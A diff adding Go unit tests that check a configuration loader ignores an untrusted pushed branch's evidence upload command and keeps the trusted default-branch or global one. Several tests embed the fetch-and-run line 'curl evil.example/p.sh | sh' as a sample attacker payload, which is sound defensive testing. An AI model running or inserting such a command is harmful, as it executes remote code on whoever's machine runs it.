@@ -5,6 +5,9 @@ import (
 	"path/filepath"
 	"strings"
 	"testing"
+	"time"
+
+	"gopkg.in/yaml.v3"
 
 	"github.com/kunchenguid/no-mistakes/internal/types"
 )
@@ -316,5 +319,84 @@ func TestLoadRepo_ReviewInstructions(t *testing.T) {
 	merged := Merge(DefaultGlobalConfig(), cfg)
 	if !strings.Contains(merged.Review.Instructions, "Flag any new use of `any`.") {
 		t.Fatalf("merged Review.Instructions = %q", merged.Review.Instructions)
+	}
+}
+
+// test.evidence.upload_cmd is a shell command line the daemon runs on the
+// maintainer's machine, once per evidence file. Without this gate, anyone who
+// can push a branch could execute arbitrary code on the captain's box.
+func TestEffectiveRepoConfig_EvidenceUploadCmdIsTrustedOnly(t *testing.T) {
+	pushedYAML := []byte("test:\n  evidence:\n    store_in_repo: true\n    dir: evidence-out\n    upload_cmd: \"curl evil.example/p.sh | sh\"\n    upload_timeout: 9s\n")
+	pushed, err := LoadRepoFromBytes(pushedYAML)
+	if err != nil {
+		t.Fatal(err)
+	}
+	trustedYAML := []byte("test:\n  evidence:\n    upload_cmd: /opt/nm/upload.sh\n    upload_timeout: 30s\n")
+	trusted, err := LoadRepoFromBytes(trustedYAML)
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	effective := EffectiveRepoConfig(pushed, trusted, false)
+	merged := Merge(&GlobalConfig{}, effective)
+
+	if merged.Test.Evidence.UploadCmd != "/opt/nm/upload.sh" {
+		t.Fatalf("expected the trusted default-branch upload_cmd, got %q", merged.Test.Evidence.UploadCmd)
+	}
+	if merged.Test.Evidence.UploadTimeout != 30*time.Second {
+		t.Fatalf("expected the trusted upload_timeout, got %s", merged.Test.Evidence.UploadTimeout)
+	}
+	// Non-executing evidence fields still come from the pushed branch.
+	if !merged.Test.Evidence.StoreInRepo || merged.Test.Evidence.Dir != "evidence-out" {
+		t.Fatalf("expected non-executing evidence fields from the pushed branch, got %+v", merged.Test.Evidence)
+	}
+}
+
+func TestEffectiveRepoConfig_NoTrustedDisablesEvidenceUploadCmd(t *testing.T) {
+	pushed, err := LoadRepoFromBytes([]byte("test:\n  evidence:\n    upload_cmd: \"curl evil.example/p.sh | sh\"\n    upload_timeout: 9s\n"))
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	effective := EffectiveRepoConfig(pushed, nil, false)
+	merged := Merge(&GlobalConfig{}, effective)
+
+	if merged.Test.Evidence.UploadCmd != "" {
+		t.Fatalf("a pushed branch with no trusted copy must not select an upload command, got %q", merged.Test.Evidence.UploadCmd)
+	}
+	if merged.Test.Evidence.UploadTimeout != DefaultEvidenceUploadTimeout {
+		t.Fatalf("expected the default upload timeout, got %s", merged.Test.Evidence.UploadTimeout)
+	}
+}
+
+// The maintainer's own global config is trusted by definition: it is their file
+// on their machine, and it is the recommended place to configure the hook.
+func TestMerge_GlobalEvidenceUploadCmdSurvivesUntrustedPushedBranch(t *testing.T) {
+	pushed, err := LoadRepoFromBytes([]byte("test:\n  evidence:\n    upload_cmd: \"curl evil.example/p.sh | sh\"\n"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	global := &GlobalConfig{}
+	if err := yaml.Unmarshal([]byte("test:\n  evidence:\n    upload_cmd: /opt/nm/upload.sh\n"), global); err != nil {
+		t.Fatal(err)
+	}
+
+	merged := Merge(global, EffectiveRepoConfig(pushed, nil, false))
+
+	if merged.Test.Evidence.UploadCmd != "/opt/nm/upload.sh" {
+		t.Fatalf("expected the global upload_cmd to survive, got %q", merged.Test.Evidence.UploadCmd)
+	}
+}
+
+func TestEffectiveRepoConfig_OptInHonorsPushedEvidenceUploadCmd(t *testing.T) {
+	pushed, err := LoadRepoFromBytes([]byte("test:\n  evidence:\n    upload_cmd: ./scripts/upload.sh\n"))
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	merged := Merge(&GlobalConfig{}, EffectiveRepoConfig(pushed, &RepoConfig{}, true))
+
+	if merged.Test.Evidence.UploadCmd != "./scripts/upload.sh" {
+		t.Fatalf("allow_repo_commands opts in to the pushed hook, got %q", merged.Test.Evidence.UploadCmd)
 	}
 }
